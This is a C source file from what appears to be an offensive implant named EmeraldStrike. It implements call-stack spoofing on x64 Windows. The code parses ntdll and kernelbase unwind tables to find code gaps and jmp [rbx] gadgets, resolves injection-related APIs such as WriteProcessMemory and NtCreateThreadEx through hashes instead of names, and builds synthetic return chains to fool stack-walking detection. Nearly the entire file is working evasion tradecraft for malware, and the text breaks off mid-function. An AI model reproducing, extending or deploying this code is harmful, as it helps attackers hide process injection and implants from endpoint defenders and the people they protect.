/*
    EmeraldStrike - LACUNA Callstack Spoofing Implementation
    Based on LACUNA Chain (0xmaz, 2026) + BYOUD (klezVirus, BHEU 2025).

    Discovery: walks ntdll / kernelbase / win32u .pdata at runtime and finds
      - GHOSTS: executable-code gaps between RUNTIME_FUNCTION entries
        (no unwind coverage -> the unwinder pops them as leaf frames)
      - NOP gaps: win32u's uniform 8-byte NOPs between syscall stubs
        (ntdll has hundreds too - used as the fallback)
      - a jmp [rbx] gadget inside a ghost (dual-use: exec redirect + leaf)
      - a machframe anchor (KiUser* dispatcher): the walk terminator
      - a pivot gadget (`add rsp,imm; ret`, function-final, declared frame
        == imm): relocates the chain above the stack-arg block for >4-arg
        calls (the desync: execution enters the epilogue mid-function,
        the walker replays the full frame)

    Everything is discovered at runtime per OS build - no hardcoded RVAs,
    no plaintext export names (all lookups are djb2-hash resolves).
    Counts vary per patch level; see research/lacuna_probe.py for the
    offline validation runs.

    All state in INSTANCE. x64 only.
*/

#include "../include/config.h"
#include "../include/common.h"

#ifdef INCLUDE_EVASION_CALLSTACK_SPOOF
#ifdef _WIN64

#include "../include/evasion/callstack_spoof.h"
#include <stdarg.h>

// ============================================================================
// Module + export hashes (djb2: H_MAGIC_KEY 8527, seed 7)
// ============================================================================

#define H_MODULE_KERNELBASE  0xb280b755
#define H_MODULE_WIN32U      0x83de4b61

#define H_RtlCreateUserThread     0x1ad9b9cc
#define H_NtAllocateVirtualMemory 0x32ce5196
#define H_LdrLoadDll              0xb5c6308d
#define H_NtCreateThreadEx        0x7b41bf7a
#define H_VirtualProtect          0x23e5e817
#define H_VirtualAllocEx          0xd4758d5e
#define H_WriteProcessMemory      0x149e0432
#define H_VirtualAlloc           0xae240921
#define H_RtlUserThreadStart      0xf913ee86
#define H_AddVectoredExceptionHandler    0xe992781
#define H_RemoveVectoredExceptionHandler 0x75e60ce6

// ============================================================================
// PE parsing - .pdata (exception directory)
// ============================================================================

static PIMAGE_RUNTIME_FUNCTION_ENTRY cs_get_pdata(PVOID hModule, DWORD *pSize) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((UINT64)hModule + pDos->e_lfanew);

    DWORD rva  = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    *pSize     = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;

    if (rva == 0 || *pSize == 0)
        return NULL;

    return (PIMAGE_RUNTIME_FUNCTION_ENTRY)((UINT64)hModule + rva);
}

// ============================================================================
// Ghost discovery (LACUNA scan_ghosts): gaps between consecutive
// RUNTIME_FUNCTION entries holding real code (non-padding), size >= 8.
// Ranked by proximity to tracked exports so frames land near the APIs they
// pretend to return into (a kernelbase ghost ending exactly at VirtualAlloc's
// entry is a perfect fake return site).
// ============================================================================

typedef struct _CS_TARGET {
    DWORD  hash;
    PVOID  va;                  // resolved at init; NULL = unavailable
} CS_TARGET, *PCS_TARGET;

typedef struct _CS_TARGETSET {
    CS_TARGET  t[8];
    DWORD      n;
} CS_TARGETSET, *PCS_TARGETSET;

static PCS_GHOST cs_best_ghost(PCS_GHOST pG, DWORD n, DWORD targetIdx, PCS_TARGETSET pTS);

static DWORD cs_scan_ghosts(PVOID moduleBase, PCS_TARGETSET pTS,
                             PCS_GHOST pOut, DWORD maxOut) {
    DWORD pdataSize = 0;
    PIMAGE_RUNTIME_FUNCTION_ENTRY pRT = cs_get_pdata(moduleBase, &pdataSize);
    if (!pRT || pdataSize == 0) return 0;

    DWORD rtCount = pdataSize / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);
    UINT64 img = (UINT64)moduleBase;
    UINT64 prev = 0;
    DWORD found = 0;

    for (DWORD i = 0; i < rtCount && found < maxOut; i++) {
        if (pRT[i].UnwindData == 0) continue;      // unused entry - LACUNA parity

        UINT64 begin = img + pRT[i].BeginAddress;
        UINT64 end   = img + pRT[i].EndAddress;

        if (prev && begin > prev) {
            UINT32 sz = (UINT32)(begin - prev);
            UINT8* gp = (UINT8*)prev;
            DWORD nonpad = 0;
            for (UINT32 k = 0; k < sz && k < 512; k++)
                if (gp[k] != 0xCC && gp[k] != 0x00 && gp[k] != 0x90)
                    nonpad++;

            if (nonpad > 4 && sz >= 8) {
                UINT32 best = 0xFFFFFFFF;
                int bestIdx = -1;
                for (DWORD t = 0; t < pTS->n; t++) {
                    if (!pTS->t[t].va) continue;
                    UINT64 tv = (UINT64)pTS->t[t].va;
                    UINT32 d = (tv >= prev && tv <= prev + sz) ? 0
                             : (tv > prev + sz) ? (UINT32)(tv - (prev + sz))
                                                : (UINT32)(prev - tv);
                    if (d < best) { best = d; bestIdx = (int)t; }
                }
                pOut[found].va_start = prev;
                pOut[found].va_end   = begin;
                pOut[found].size     = sz;
                pOut[found].name     = (const char*)(UINT_PTR)bestIdx;  // target index
                pOut[found].dist     = best;
                found++;
            }
        }
        prev = end;
    }
    return found;
}

// Best ghost whose nearest tracked export is targetIdx (lowest distance).
static PCS_GHOST cs_best_ghost(PCS_GHOST pG, DWORD n, DWORD targetIdx, PCS_TARGETSET pTS) {
    PCS_GHOST best = NULL;
    UINT32 bd = 0xFFFFFFFF;
    for (DWORD i = 0; i < n; i++) {
        if ((DWORD)(UINT_PTR)pG[i].name == targetIdx && pG[i].dist < bd) {
            bd = pG[i].dist;
            best = &pG[i];
        }
    }
    return best;
}

// ============================================================================
// NOP-gap discovery: win32u's uniform 8-byte NOP (0F 1F 84 00 00 00 00 00)
// between syscall stubs; generic padding-only gaps 4..16 bytes also accepted.
// ============================================================================

static UINT64 cs_nop_gap(PVOID moduleBase) {
    DWORD pdataSize = 0;
    PIMAGE_RUNTIME_FUNCTION_ENTRY pRT = cs_get_pdata(moduleBase, &pdataSize);
    if (!pRT || pdataSize == 0) return 0;

    DWORD rtCount = pdataSize / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);
    UINT64 img = (UINT64)moduleBase;
    UINT64 prev = 0;

    for (DWORD i = 0; i < rtCount; i++) {
        if (pRT[i].UnwindData == 0) continue;
        UINT64 begin = img + pRT[i].BeginAddress;
        if (prev && begin > prev) {
            UINT32 gap = (UINT32)(begin - prev);
            if (gap >= 4 && gap <= 16) {
                UINT8* gp = (UINT8*)prev;
                BOOL ok = FALSE;
                if (gap == 8 && gp[0] == 0x0F && gp[1] == 0x1F && gp[2] == 0x84) {
                    ok = TRUE;                        // win32u nop8
                } else {
                    ok = TRUE;
                    for (UINT32 k = 0; k < gap; k++)
                        if (gp[k] != 0x00 && gp[k] != 0xCC && gp[k] != 0x90)
                            { ok = FALSE; break; }
                }
                if (ok) return prev;
            }
        }
        prev = img + pRT[i].EndAddress;
    }
    return 0;
}

// ============================================================================
// Ghost gadget: jmp [rbx] (FF 23) inside a ghost region - executes as the
// restore redirect, walks as a leaf. Not required for the stomp path.
// ============================================================================

static UINT64 cs_ghost_gadget(PCS_GHOST pG, DWORD n) {
    for (DWORD i = 0; i < n; i++) {
        UINT8* p = (UINT8*)pG[i].va_start;
        UINT32 sz = pG[i].size;
        for (UINT32 k = 0; k + 1 < sz; k++)
            if (p[k] == 0xFF && p[k + 1] == 0x23)
                return pG[i].va_start + k;
    }
    return 0;
}

// ============================================================================
// Machframe anchor (LACUNA find_mf_target): a RUNTIME_FUNCTION whose
// UNWIND_INFO carries UWOP_PUSH_MACHFRAME at CodeOffset 0 - unwinding ANY
// PC inside it consumes a 40-byte machine frame planted at the walker's
// Rsp. Exactly 4 ntdll functions qualify (the KiUser* dispatchers).
// Use Begin+4 as the chain terminator: a planted machine frame with
// Rip=0 makes every walker stop.
// ============================================================================

static UINT64 cs_find_mf_anchor(PVOID ntdllBase) {
    DWORD pdataSize = 0;
    PIMAGE_RUNTIME_FUNCTION_ENTRY pRT = cs_get_pdata(ntdllBase, &pdataSize);
    if (!pRT || pdataSize == 0) return 0;

    DWORD rtCount = pdataSize / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);
    UINT64 img = (UINT64)ntdllBase;

    for (DWORD i = 0; i < rtCount; i++) {
        if (pRT[i].UnwindData == 0) continue;
        PDS_UNWIND_INFO pInfo = (PDS_UNWIND_INFO)(img + pRT[i].UnwindData);
        PDS_UNWIND_CODE pCode = (PDS_UNWIND_CODE)pInfo->UnwindCode;
        for (DWORD j = 0; j < pInfo->CountOfCodes; j++) {
            if ((pCode[j].UnwindOp == DS_UWOP_PUSH_MACH_FRAME) && (pCode[j].CodeOffset == 0))
                return img + pRT[i].BeginAddress + 4;
        }
    }
    return 0;
}

// ============================================================================
// Unwind API typedefs (pivot calibration, probe)
// ============================================================================
typedef PVOID (WINAPI *fn_RtlLookupFunctionEntry_t)(UINT64, PUINT64, PVOID);
typedef VOID (WINAPI *fn_RtlVirtualUnwind_t)(DWORD, UINT64, UINT64, PVOID, PVOID, PVOID*, PVOID*, DWORD);

// ============================================================================
// Pivot gadget discovery (the >4-arg primitive's desync engine).
//
// The pivot is a `jmp [rbx]` (FF 23) inside a .pdata-COVERED function - the
// opposite of the ghost gadget (which must be UNcovered). Planted as the
// target's return address it splits execution from the walk:
//   EXECUTION: target rets -> pivot -> jmp [rbx] -> ghost_restore. We own
//     rbx (the restore-slot pointer) and the target preserves it
//     (callee-saved) - no imm math, no pops to fake, pushes irrelevant.
//   WALK: RtlVirtualUnwind replays the containing function's REAL prolog
//     from the mid-function RIP -> its Rsp jumps the full declared frame
//     S -> RA = [R+8+S] - our planted [L1..L4][mf-anchor][machframe Rip=0]
//     chain, terminating every walker. The chain sits above the stack-arg
//     block ([R+0x28..)), which frees >4-arg calls AND makes the shadow
//     home callee-writable (home-spilling Win32 APIs are safe).
//
// The ONLY metadata authority is the unwinder itself: cs_measure_pivot
// runs the REAL LFE+VU on a synthetic context and measures the replay.
// Hand-parsing UNWIND_INFO burned twice (2026-11-09: first nibble-order,
// then the UWOP opcode table - ALLOC_LARGE is op 1 with size = slot*8,
// ALLOC_SMALL is op 2 with size = (info+1)*8; a kernel32 gadget parsed as
// 0x48 actually replays per a 0x3E0-frame function). The only raw byte
// trusted below is SizeOfProlog.
//
// Calibration crash-safety (dump-verified: AV at RtlVirtualUnwind2,
// near-NULL deref at 0x164 with a zeroed context): the synthetic context
// gets Rsp == Rbp == the MIDDLE of a 1MB pattern buffer, so frame-pointer
// and save-restore reads stay inside mapped pattern memory instead of
// dereferencing NULL+offset; a replay that escapes the accepted range
// (0x28..0x2000) or lands the RA on the pattern is rejected.
// ============================================================================

// ---------------------------------------------------------------------------
// Pre-filter: parse the function's frame with the AUTHORITATIVE x64 opcode
// table. This exists ONLY to reject candidates whose metadata we do not
// fully understand before handing them to the unwinder (the calibration is
// still the number of record). Two shipped bugs make the table worth
// spelling out: the op lives in the HIGH byte of the u16 slot (low byte =
// CodeOffset), and UWOP_ALLOC_LARGE is op 1 (size = next slot * 8; *16 when
// OpInfo==1) while UWOP_ALLOC_SMALL is op 2 (size = (OpInfo+1)*8). With the
// old table op 8 (PUSH_MACHFRAME) fell through as a 3-slot save and VU
// executed machframe semantics against a synthetic context - AV inside
// RtlVirtualUnwind2 at a near-NULL address (dump-verified twice).
// Returns frame bytes, or (UINT64)-1 when anything is unusual.
static UINT64 cs_frame_alloc(PIMAGE_RUNTIME_FUNCTION_ENTRY rf, UINT64 ib, DWORD* pProlog) {
    PDS_UNWIND_INFO pInfo = (PDS_UNWIND_INFO)(ib + rf->UnwindData);
    if (pInfo->Version != 1) return (UINT64)-1;               // v2/native: unknown layout
    if (pInfo->Flags & 0x04) return (UINT64)-1;               // chained info
    if (pInfo->FrameRegister) return (UINT64)-1;              // frame pointer (rbp-relative)
    PDS_UNWIND_CODE uc = (PDS_UNWIND_CODE)pInfo->UnwindCode;
    DWORD n = pInfo->CountOfCodes;
    UINT64 total = 0;
    DWORD j = 0;
    while (j < n) {
        switch (uc[j].UnwindOp) {
        case 0:  total += 8;                          j += 1; break; // PUSH_NONVOL
        case 1:  // ALLOC_LARGE: operand in the next slot
            if (uc[j].OpInfo == 1) { total += 16ULL * uc[j+1].FrameOffset; }
            else                   { total += 8ULL  * uc[j+1].FrameOffset; }
            j += 2; break;
        case 2:  total += 8ULL * (uc[j].OpInfo + 1);  j += 1; break; // ALLOC_SMALL
        case 4:  j += 2; break;                                      // SAVE_NONVOL
        case 5:  j += 3; break;                                      // SAVE_NONVOL_FAR
        case 6:  j += 2; break;                                      // SAVE_XMM128
        case 7:  j += 3; break;                                      // SAVE_XMM128_FAR
        default: return (UINT64)-1;   // SET_FPREG(3) / MACHFRAME(8) / reserved
        }
    }
    if (pProlog) *pProlog = pInfo->SizeOfProlog;
    return total;
}

// ---------------------------------------------------------------------------
// Calibration fault recovery. Some .pdata entries make the real unwinder
// fault on a SYNTHETIC context (near-NULL deref inside RtlVirtualUnwind2 -
// dump-verified on ntdll 26100.9711, fault address 0x164). Those functions
// are simply unusable as pivots; the VEH below turns the fault into a
// rejection: while g_calib_armed it diverts the faulting context into the
// asm bail stub, which restores the cs_calib_set frame and makes
// cs_calib_set return 1. The handler touches ONLY the context (no VEH-list
// mutation), and it is installed only for the discovery sweep.
static UINT64 g_calib_sav[8];
static PVOID  g_calib_veh;
static PVOID  g_calib_range_base;
static PVOID  g_calib_range_end;
static volatile LONG g_calib_armed;
static volatile LONG g_calib_faulted;

static LONG WINAPI cs_calib_veh_fn(EXCEPTION_POINTERS* ep) {
    if (!g_calib_armed) return EXCEPTION_CONTINUE_SEARCH;
    if (ep->ExceptionRecord->ExceptionCode != 0xC0000005) return EXCEPTION_CONTINUE_SEARCH;
    // The armed window covers ONLY the two unwind-API calls, so any AV
    // raised while armed came from them - divert it.
    g_calib_armed = 0;
    g_calib_faulted = 1;
    ep->ContextRecord->Rip = (UINT64)&cs_calib_bail;
    ep->ContextRecord->Rcx = (UINT64)&g_calib_sav[0];
    ep->ContextRecord->Rsp = (UINT64)&g_calib_sav[0] + 64;
    ep->ContextRecord->Rbp = 0;
    return EXCEPTION_CONTINUE_EXECUTION;
}

// Measure the walk-replay delta of a candidate gadget with the real
// unwinder. Returns the delta (bytes VU adds to Rsp past the RA slot) or
// (UINT64)-1 when the gadget is unusable.
static UINT64 cs_measure_pivot(struct _INSTANCE* inst, UINT64 gadget) {
    fn_RtlLookupFunctionEntry_t pLFE = (fn_RtlLookupFunctionEntry_t)(void*)inst->Win32.GetProcAddress(
        (HMODULE)inst->Modules.Ntdll, "RtlLookupFunctionEntry");
    fn_RtlVirtualUnwind_t pVU = (fn_RtlVirtualUnwind_t)(void*)inst->Win32.GetProcAddress(
        (HMODULE)inst->Modules.Ntdll, "RtlVirtualUnwind");
    if (!pLFE || !pVU) return (UINT64)-1;

    SIZE_T sz = 0x100000;                       // 1MB pattern buffer
    UINT64* buf = (UINT64*)es_malloc(inst, sz);
    if (!buf) return (UINT64)-1;
    UINT64 pat = 0xdeadbeefdeadbeefULL;
    for (DWORD i = 0; i < sz / 8; i++) buf[i] = pat;

    CONTEXT ctx;
    es_memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = 0x100005;                // CONTEXT_FULL
    ctx.Rip = gadget;
    // middle of the buffer: fpreg-relative reads stay in mapped pattern
    ctx.Rsp = (UINT64)(buf + (sz / 16));
    ctx.Rbp = ctx.Rsp;

    UINT64 base = ctx.Rsp;
    UINT64 ib = 0;
    PVOID fe = NULL;
    UINT64 delta = (UINT64)-1;
    // Fault-guard the WHOLE measurement (LFE included): the dump-verified
    // AV sits in an ntdll unwind-core function reachable from either entry
    // point, so the armed window must cover both calls.
    if (cs_calib_set(&g_calib_sav[0]) == 0) {
        g_calib_faulted = 0;
        g_calib_armed = 1;
        fe = pLFE(gadget, &ib, NULL);
        if (g_calib_armed && fe) {
            PVOID handler = NULL;
            PVOID est = NULL;
            pVU(0, ib, gadget, fe, &ctx, &handler, &est, 0);
        }
        g_calib_armed = 0;
        if (!g_calib_faulted && fe && ctx.Rip != pat && ctx.Rsp > base) {
            UINT64 d = ctx.Rsp - base - 8;
            if (d >= 0x28 && d <= 0x2000) delta = d;
        }
    } else {
        g_calib_armed = 0;              // VEH already disarmed itself
    }
    es_free(inst, buf);
    return delta;
}

// Discover pivot candidates in a module and CALIBRATE each with the real
// unwinder; keep the best (largest measured walk-replay frame = most
// stack-arg headroom). The pdata walk below only enumerates candidate
// SITES; every accept/reject decision comes from cs_measure_pivot.
static void cs_find_pivot_gadget(struct _INSTANCE* inst, PVOID moduleBase, PGHOST_SPOOFER sp) {
    DWORD pdataSize = 0;
    PIMAGE_RUNTIME_FUNCTION_ENTRY pRT = cs_get_pdata(moduleBase, &pdataSize);
    if (!pRT || pdataSize == 0) return;

    DWORD rtCount = pdataSize / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);
    UINT64 img = (UINT64)moduleBase;

    for (DWORD i = 0; i < rtCount; i++) {
        if (pRT[i].UnwindData == 0) continue;
        UINT64 begin = img + pRT[i].BeginAddress;
        UINT64 end   = img + pRT[i].EndAddress;
        if (end <= begin || end - begin > 0x8000) continue;
        if (pRT[i].UnwindData > 0x400000) continue;          // RVA sanity

        // pre-filter: only fully-understood plain frames reach the unwinder
        DWORD prolog = 0;
        UINT64 S = cs_frame_alloc(&pRT[i], img, &prolog);
        if (S == (UINT64)-1 || S < 0x28 || S > 0x2000) continue;
        if (prolog >= (DWORD)(end - begin)) continue;

        // FF 23 (jmp [rbx]) at/after the prolog end -> full-frame replay
        UINT8* p = (UINT8*)begin + prolog;
        UINT8* stop = (UINT8*)end - 1;
        for (; p < stop; p++) {
            if (p[0] == 0xFF && p[1] == 0x23) {
                sp->PivotCandidate = (PVOID)p;    // crash-dump diagnostics
                UINT64 measured = cs_measure_pivot(inst, (UINT64)p);
                if (measured != (UINT64)-1 && measured > sp->PivotImm) {
                    sp->PivotGadget = (PVOID)p;
                    sp->PivotImm    = measured;   // the REAL walk replay delta
                }
                break;                       // one per function is enough
            }
        }
    }
}

// ============================================================================
// Init: modules -> target exports -> ghost scan -> chain pick
// ============================================================================

static void cs_ts_add(PCS_TARGETSET pTS, DWORD hash, PVOID va) {
    if (pTS->n >= 8) return;
    pTS->t[pTS->n].hash = hash;
    pTS->t[pTS->n].va   = va;
    pTS->n++;
}

BOOL callstack_spoof_init(PINSTANCE inst) {
    PGHOST_SPOOFER sp = &inst->GhostSpoofer;
    es_memset(sp, 0, sizeof(GHOST_SPOOFER));

    sp->NtdllBase = inst->Modules.Ntdll;
    sp->KernelBase = resolve_module_peb(H_MODULE_KERNELBASE);
    if (!sp->NtdllBase || !sp->KernelBase) {
        DBG(inst, "[ES] Callstack spoof: module resolve failed");
        return FALSE;
    }
    sp->Win32uBase = resolve_module_peb(H_MODULE_WIN32U);   // optional; no load

    // tracked exports for distance ranking (hash resolves - no name strings)
    CS_TARGETSET ntT; CS_TARGETSET kbT;
    es_memset(&ntT, 0, sizeof(ntT));
    es_memset(&kbT, 0, sizeof(kbT));
    cs_ts_add(&ntT, H_RtlCreateUserThread,     resolve_function(sp->NtdllBase, H_RtlCreateUserThread));
    cs_ts_add(&ntT, H_NtAllocateVirtualMemory, resolve_function(sp->NtdllBase, H_NtAllocateVirtualMemory));
    cs_ts_add(&ntT, H_LdrLoadDll,              resolve_function(sp->NtdllBase, H_LdrLoadDll));
    cs_ts_add(&ntT, H_NtCreateThreadEx,        resolve_function(sp->NtdllBase, H_NtCreateThreadEx));
    cs_ts_add(&kbT, H_VirtualProtect,          resolve_function(sp->KernelBase, H_VirtualProtect));
    cs_ts_add(&kbT, H_VirtualAllocEx,          resolve_function(sp->KernelBase, H_VirtualAllocEx));
    cs_ts_add(&kbT, H_WriteProcessMemory,      resolve_function(sp->KernelBase, H_WriteProcessMemory));
    cs_ts_add(&kbT, H_VirtualAlloc,            resolve_function(sp->KernelBase, H_VirtualAlloc));

    CS_GHOST ng[CS_MAX_GHOSTS];
    CS_GHOST kg[CS_MAX_GHOSTS];
    DWORD nNg = cs_scan_ghosts(sp->NtdllBase,  &ntT, ng, CS_MAX_GHOSTS);
    DWORD nKg = cs_scan_ghosts(sp->KernelBase, &kbT, kg, CS_MAX_GHOSTS);
    if (nNg == 0 || nKg == 0) {
        DBG(inst, "[ES] Callstack spoof: no ghosts found");
        return FALSE;
    }

    // ---- chain selection (indices into the target sets) ----
    #define NT_T_RtlCreateUserThread   0
    #define NT_T_NtAllocateVirtualMem  1
    #define NT_T_LdrLoadDll            2
    #define NT_T_NtCreateThreadEx      3
    #define KB_T_VirtualProtect       4
    #define KB_T_VirtualAllocEx       5
    #define KB_T_WriteProcessMemory    6
    #define KB_T_VirtualAlloc         7

    PCS_GHOST g;

    // L2: kernelbase ghost near a memory-API export - its frames make
    // VirtualProtect/Alloc-class returns look native
    g = cs_best_ghost(kg, nKg, KB_T_VirtualProtect, &kbT);
    if (!g) g = cs_best_ghost(kg, nKg, KB_T_VirtualAllocEx, &kbT);
    if (!g) g = cs_best_ghost(kg, nKg, KB_T_VirtualAlloc, &kbT);
    if (!g) g = &kg[0];
    sp->L2Ghost = (PVOID)(g->va_start + (g->size / 2));   // mid-ghost, never an entry

    // L3: ntdll ghost near a thread/alloc export
    g = cs_best_ghost(ng, nNg, NT_T_RtlCreateUserThread, &ntT);
    if (!g) g = cs_best_ghost(ng, nNg, NT_T_NtAllocateVirtualMem, &ntT);
    if (!g) g = &ng[0];
    sp->L3Ghost = (PVOID)(g->va_start + (g->size / 2));

    // L1: a different ntdll ghost
    g = cs_best_ghost(ng, nNg, NT_T_LdrLoadDll, &ntT);
    if (!g || (PVOID)(g->va_start + (g->size / 2)) == sp->L3Ghost)
        g = &ng[nNg > 1 ? 1 : 0];
    sp->L1Ghost = (PVOID)(g->va_start + (g->size / 2));

    // L4: win32u nop gap (if loaded), else an ntdll nop gap, else L1
    sp->L4NopGap = (PVOID)cs_nop_gap(sp->Win32uBase ? sp->Win32uBase : sp->NtdllBase);
    if (!sp->L4NopGap) sp->L4NopGap = sp->L1Ghost;

    // L5: thread root - the walk terminates inside real metadata
    PVOID rtlStart = resolve_function(sp->NtdllBase, H_RtlUserThreadStart);
    if (!rtlStart) {
        DBG(inst, "[ES] Callstack spoof: no RtlUserThreadStart");
        return FALSE;
    }
    sp->L5ThreadRoot = (PVOID)((UINT64)rtlStart + 0x21);

    // dual-use gadget (optional: powers the <=4-arg call primitive)
    UINT64 gadget = cs_ghost_gadget(ng, nNg);
    if (!gadget) gadget = cs_ghost_gadget(kg, nKg);
    sp->GhostGadget = (PVOID)gadget;

    // machframe anchor: REQUIRED for both primitives' walk termination
    // (RtlUserThreadStart+0x21 does NOT terminate on ntdll 26100+ - see
    // the asm header). Without it the primitives stay disabled.
    sp->MfAnchor = (PVOID)cs_find_mf_anchor(sp->NtdllBase);

    // pivot gadget for the >4-arg primitive (any-arg transport-class calls):
    // a jmp [rbx] inside a covered function with a usable declared frame.
    // Scans every always-loaded module and keeps the largest frame (most
    // stack-arg headroom). Optional: without it only <=4-arg calls spoof
    // (the dispatcher falls back to direct calls for anything bigger).
    // The sweep is VEH-guarded: candidates that fault the unwinder on a
    // synthetic context are rejected, not fatal.
    sp->PivotGadget = NULL;
    sp->PivotImm    = 0;
    {
        PVOID pAddVeh = resolve_function(inst->Modules.Kernel32, H_AddVectoredExceptionHandler);
        PVOID pRemoveVeh = resolve_function(inst->Modules.Kernel32, H_RemoveVectoredExceptionHandler);
        if (!pAddVeh && inst->Win32.GetProcAddress) {
            pAddVeh = (PVOID)inst->Win32.GetProcAddress((HMODULE)inst->Modules.Kernel32, "AddVectoredExceptionHandler");
            pRemoveVeh = (PVOID)inst->Win32.GetProcAddress((HMODULE)inst->Modules.Kernel32, "RemoveVectoredExceptionHandler");
        }
        if (pAddVeh)
            g_calib_veh = ((PVOID (WINAPI*)(ULONG, PVOID))pAddVeh)(1, (PVOID)cs_calib_veh_fn);
        // divert only faults inside the unwinder we call
        g_calib_range_base = sp->NtdllBase;
        g_calib_range_end   = (PVOID)((UINT64)sp->NtdllBase + 0x300000);

        cs_find_pivot_gadget(inst, sp->NtdllBase, sp);
        cs_find_pivot_gadget(inst, sp->KernelBase, sp);
        cs_find_pivot_gadget(inst, inst->Modules.Kernel32, sp);

        if (g_calib_veh && pRemoveVeh) {
            ((ULONG (WINAPI*)(PVOID))pRemoveVeh)(g_calib_veh);
            g_calib_veh = NULL;
        }
    }

    // chain bounds (diagnostics)
    UINT64 mn = (UINT64)sp->L1Ghost, mx = (UINT64)sp->L1Ghost;
    PVOID chain[7] = { sp->GhostGadget, sp->L2Ghost, sp->L3Ghost, sp->L4NopGap,
                       sp->MfAnchor, sp->L5ThreadRoot, sp->PivotGadget };
    for (int i = 0; i < 7; i++) {
        if (!chain[i]) continue;
        if ((UINT64)chain[i] < mn) mn = (UINT64)chain[i];
        if ((UINT64)chain[i] > mx) mx = (UINT64)chain[i];
    }
    sp->ChainMin = mn;
    sp->ChainMax = mx;

    if (!sp->L1Ghost || !sp->L2Ghost || !sp->L3Ghost || !sp->L5ThreadRoot) {
        DBG(inst, "[ES] Callstack spoof: chain incomplete");
        return FALSE;
    }

    inst->bCallstackSpoofInit = TRUE;
    DBG(inst, "[ES] Callstack spoof initialized (lacuna engine)");
    return TRUE;
}

// ============================================================================
// Unwind-info sanity gate. Under module stomp/overload the transplanted
// .pdata on the relocated copy can be INCONSISTENT (the documented
// transplanted-pdata trap): RtlLookupFunctionEntry still returns an entry,
// but its UNWIND_INFO is garbage - RtlpUnwindPrologue then applies wild
// unwind codes and writes restored nonvolatiles to wild home slots
// (dump-verified: write to 0x0700000098, AV in ntdll!RtlpUnwindPrologue,
// stomp-mode build 2026-11-09). NEVER call RtlVirtualUnwind on an entry
// that fails this gate - break the walk instead (the plant/probe degrade
// gracefully; the crash does not).
static BOOL cs_sane_unwind(UINT64 ib, PVOID fe) {
    PIMAGE_RUNTIME_FUNCTION_ENTRY rf = (PIMAGE_RUNTIME_FUNCTION_ENTRY)fe;
    if (!ib || !rf) return FALSE;
    if (rf->BeginAddress == 0 || rf->EndAddress <= rf->BeginAddress) return FALSE;
    if (rf->EndAddress > 0x600000) return FALSE;                 // RVA outside a sane image
    if (rf->UnwindData == 0 || rf->UnwindData > 0x600000) return FALSE;
    PDS_UNWIND_INFO pInfo = (PDS_UNWIND_INFO)(ib + rf->UnwindData);
    UINT ver = pInfo->Version;
    if (ver < 1 || ver > 3) return FALSE;                        // garbage version byte
    if (pInfo->CountOfCodes > 0x3F) return FALSE;                // 6-bit field max anyway
    if (pInfo->SizeOfProlog > (rf->EndAddress - rf->BeginAddress)) return FALSE;
    // chained info is legal but none of our frames use it - do not risk it here
    if (pInfo->Flags & 0x04) return FALSE;
    return TRUE;
}

// ============================================================================
// RETIRED stomp windows (2026-11-09 session: disabled; 2026-11-10 rework:
// deleted). ghost_chain_plant/restore are permanent no-ops kept only for
// the transport/sleep include sites. The failure history of frame
// stomping (saved-register corruption, VEH-list fail-fast, wild
// RtlpUnwindPrologue writes, pre-egress hang) is preserved in
// references/notes-windows-rework.md - do NOT resurrect this architecture;
// the synthetic-stack primitives (ghost_spoof_call /
// ghost_spoof_call_args) are the replacement: they never touch real
// frames, so none of the four failure classes can recur.
// ============================================================================

VOID ghost_chain_plant(struct _INSTANCE* inst)   { (void)inst; }
VOID ghost_chain_restore(struct _INSTANCE* inst) { (void)inst; }


// ============================================================================
// Spoofed dispatch
// ============================================================================

PVOID callstack_spoofed_call(PINSTANCE inst, PVOID pTarget, DWORD nArgs, ...) {
    PGHOST_SPOOFER sp = &inst->GhostSpoofer;

    // STATIC, not stack: the primitives' asm reads args from this array
    // via sp->StackArgs after our frame has teleported rsp - it must not
    // live in a frame the synthetic window overlaps. The agent is
    // single-threaded; this runs under the dispatch lock.
    static UINT64 a[11];

    es_memset(a, 0, sizeof(a));
    va_list va;
    va_start(va, nArgs);
    for (DWORD i = 0; i < nArgs && i < 11; i++) a[i] = va_arg(va, UINT64);
    va_end(va);

    typedef PVOID (*FN11)(UINT64,UINT64,UINT64,UINT64,UINT64,UINT64,
                          UINT64,UINT64,UINT64,UINT64,UINT64);

    if (!inst->bCallstackSpoofInit)
        return ((FN11)pTarget)(a[0],a[1],a[2],a[3],a[4],a[5],
                               a[6],a[7],a[8],a[9],a[10]);

    // <= 4 register args with the dual-use gadget AND machframe anchor
    // available: full synthetic chain primitive (asm stub). The MfAnchor
    // requirement is not optional: it is the only walk terminator that
    // survives ntdll-internal walkers.
    // Under MODULE_STOMP_OVERLOAD both primitives are gated off (T2
    // isolation 2026-11-09, kept until the overload pdata transfer is
    // validated): overload builds then run direct calls only.
#ifndef MODULE_STOMP_OVERLOAD
    if (nArgs <= 4 && sp->GhostGadget && sp->MfAnchor) {
        sp->Target = pTarget;
        sp->Nargs  = nArgs;
        sp->Arg1 = (PVOID)a[0];
        sp->Arg2 = (PVOID)a[1];
        sp->Arg3 = (PVOID)a[2];
        sp->Arg4 = (PVOID)a[3];
        return ghost_spoof_call(sp);
    }

    // 5..11 args: pivot primitive. The chain window is relocated above the
    // stack-arg block by the pivot's declared frame, so nothing collides -
    // but the frame caps the supported count: R+8+S must sit above the last
    // arg slot (R+0x28+8*(nArgs-5)), i.e. nArgs <= 4 + (S-0x20)/8.
    if (nArgs >= 5 && nArgs <= CS_MAX_ARGS &&
        sp->MfAnchor && sp->PivotGadget &&
        sp->PivotImm >= 0x28 &&
        nArgs <= 4 + (DWORD)((sp->PivotImm - 0x20) / 8)) {
        sp->Target = pTarget;
        sp->Nargs  = nArgs;
        sp->Arg1 = (PVOID)a[0];
        sp->Arg2 = (PVOID)a[1];
        sp->Arg3 = (PVOID)a[2];
